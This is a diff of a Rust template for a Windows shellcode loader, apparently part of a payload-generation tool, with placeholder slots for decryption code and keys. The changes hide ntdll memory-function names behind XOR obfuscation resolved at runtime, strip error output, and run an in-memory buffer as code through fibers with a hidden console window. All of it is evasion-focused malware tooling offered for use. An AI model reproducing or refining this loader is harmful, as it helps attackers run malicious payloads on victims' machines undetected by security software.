@@ -1,24 +1,25 @@
 #![windows_subsystem = "windows"]
 #![allow(non_snake_case)]
 
+use std::ffi::CString;
+use std::include_bytes;
 use std::ptr::null_mut;
 
-use ntapi::ntmmapi::NtProtectVirtualMemory;
-use ntapi::ntmmapi::NtWriteVirtualMemory;
-use ntapi::{ntmmapi::NtAllocateVirtualMemory, ntpsapi::NtCurrentProcess};
-use winapi::ctypes::c_void;
 use winapi::{
-    shared::ntdef::NT_SUCCESS,
-    um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE},
+    um::{
+        winnt::{MEM_COMMIT, PAGE_READWRITE, MEM_RESERVE, PAGE_EXECUTE_READ},
+        libloaderapi::{GetModuleHandleA, GetProcAddress},
+    },
+    shared::{
+        ntdef::{NT_SUCCESS, HANDLE},
+    },
+    ctypes::c_void,
 };
 use windows_sys::Win32::{
-    Foundation::GetLastError,
     System::Threading::{
         ConvertThreadToFiber, CreateFiberEx, SwitchToFiber, LPFIBER_START_ROUTINE,
     },
 };
-
-use std::include_bytes;
 
 {{IMPORTS}}
 
@@ -26,80 +27,57 @@ use std::include_bytes;
 
 {{DECRYPTION_FUNCTION}}
 
+const K: u8 = {{API_KEY}};
+const OBF_B: &[u8] = &{{OBF_NT_ALLOCATE_VIRTUAL_MEMORY}};
+const OBF_C: &[u8] = &{{OBF_NT_WRITE_VIRTUAL_MEMORY}};
+const OBF_D: &[u8] = &{{OBF_NT_PROTECT_VIRTUAL_MEMORY}};
+
+fn r(d: &[u8]) -> Vec<u8> {
+    d.iter().map(|b| b ^ K).collect()
+}
+
+unsafe fn g(n: &[u8]) -> *const () {
+    let h = GetModuleHandleA(b"ntdll\0".as_ptr() as *const i8);
+    let s = r(n);
+    let c = CString::new(s).unwrap();
+    GetProcAddress(h, c.as_ptr()) as *const ()
+}
+
+type FB = unsafe extern "system" fn(HANDLE, *mut *mut c_void, usize, *mut usize, u32, u32) -> i32;
+type FC = unsafe extern "system" fn(HANDLE, *mut c_void, *mut c_void, usize, *mut usize) -> i32;
+type FD = unsafe extern "system" fn(HANDLE, *mut *mut c_void, *mut usize, u32, *mut u32) -> i32;
+
 fn enhance(mut buf: Vec<u8>) {
+    let current_process: HANDLE = -1isize as HANDLE;
+
     unsafe {
-        // Execution method ported from Maldev Academy "Utilizing fibers for execution" module. Thanks Maldev !
+        let f_alloc: FB = std::mem::transmute(g(OBF_B));
+        let f_write: FC = std::mem::transmute(g(OBF_C));
+        let f_protect: FD = std::mem::transmute(g(OBF_D));
 
-        let mut allocstart: *mut c_void = null_mut();
+        let mut base: *mut c_void = null_mut();
         let mut size: usize = buf.len();
-        let alloc_status = NtAllocateVirtualMemory(
-            NtCurrentProcess,
-            &mut allocstart,
-            0,
-            &mut size,
-            MEM_COMMIT | MEM_RESERVE,
-            PAGE_READWRITE,
-        );
-        if !NT_SUCCESS(alloc_status) {
-            panic!(
-                "Error allocating memory to the local process: {}",
-                alloc_status
-            );
-        }
+        let s = f_alloc(current_process, &mut base, 0, &mut size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if !NT_SUCCESS(s) { return; }
 
-        let mut byteswritten = 0;
-        let buffer = buf.as_mut_ptr() as *mut c_void;
-        let mut buffer_length = buf.len();
-        let write_status = NtWriteVirtualMemory(
-            NtCurrentProcess,
-            allocstart,
-            buffer,
-            buffer_length,
-            &mut byteswritten,
-        );
-        if !NT_SUCCESS(write_status) {
-            panic!("Error writing to the local process: {}", write_status);
-        }
+        let mut written = 0;
+        let ptr = buf.as_mut_ptr() as *mut c_void;
+        let len = buf.len();
+        let s = f_write(current_process, base, ptr, len, &mut written);
+        if !NT_SUCCESS(s) { return; }
 
-        let mut old_perms = PAGE_READWRITE;
-        let protect_status = NtProtectVirtualMemory(
-            NtCurrentProcess,
-            &mut allocstart,
-            &mut buffer_length,
-            PAGE_EXECUTE_READWRITE,
-            &mut old_perms,
-        );
-        if !NT_SUCCESS(protect_status) {
-            panic!(
-                "[-] Failed to call NtProtectVirtualMemory: {:#x}",
-                protect_status
-            );
-        }
+        let mut old: u32 = PAGE_READWRITE;
+        let mut psize = len;
+        let s = f_protect(current_process, &mut base, &mut psize, PAGE_EXECUTE_READ, &mut old);
+        if !NT_SUCCESS(s) { return; }
 
-        let buf_ptr: LPFIBER_START_ROUTINE = std::mem::transmute(allocstart);
-
-        // Creating a new fiber
-        // move this call to CreateFiberEx, as CreateFiber calls CreateFiberEx
+        let buf_ptr: LPFIBER_START_ROUTINE = std::mem::transmute(base);
         let buf_fiber_address = CreateFiberEx(0, 0, 0, buf_ptr, null_mut());
+        if buf_fiber_address.is_null() { return; }
 
-        if buf_fiber_address.is_null() {
-            eprintln!("[!] CreateFiber Failed With Error: {}", GetLastError());
-            return;
-        }
-
-        // Convert the current thread to a fiber
-        // no need to move this call, already the lowest
         let primary_fiber_address = ConvertThreadToFiber(null_mut());
-        if primary_fiber_address.is_null() {
-            eprintln!(
-                "[!] ConvertThreadToFiber Failed With Error: {}",
-                GetLastError()
-            );
-            return;
-        }
+        if primary_fiber_address.is_null() { return; }
 
-        // Switch to the shellcode fiber
-        // no need to move this call, already the lowest
         SwitchToFiber(buf_fiber_address);
     }
 }
